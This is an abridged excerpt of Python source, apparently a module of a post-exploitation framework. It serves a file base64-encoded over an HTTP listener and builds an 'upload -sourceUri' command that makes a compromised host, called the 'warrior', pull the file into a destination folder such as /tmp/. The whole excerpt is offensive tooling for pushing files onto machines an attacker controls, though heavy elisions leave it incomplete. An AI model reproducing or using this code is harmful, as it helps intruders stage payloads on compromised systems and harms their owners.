...
class SendFile(BaseHTTPRequestHandler): 
    ...
    def do_GET(self): 
        ...
        with open(FILE, 'rb') as f:
            try:
                response = b64encode(f.read()) # response ya esta codificado por base64
            except:
                pass
            f.close()
    ...
    def __init__(self):
        ...
        options = {"warrior": [None, "Warrior in war", True],
                   ...
                   "interface": ["0.0.0.0", "Listener address", True],
                    ...
                    "dest": ["/tmp/", "Destination folder in warrior", True]}
...
"""
        ...
        self.args["dest"] = self.args["dest"].replace('\\', '/')
        if not self.args["dest"].endswith('/'):
            self.args["dest"] += '/'
        destFile = self.args["dest"] + path.split(self.args["file"])[1]

        print(destFile)

        function += "upload -sourceUri 'http://{}:{}/' -destination '{}'".format(self.args["ip"], self.args["port"], destFile)
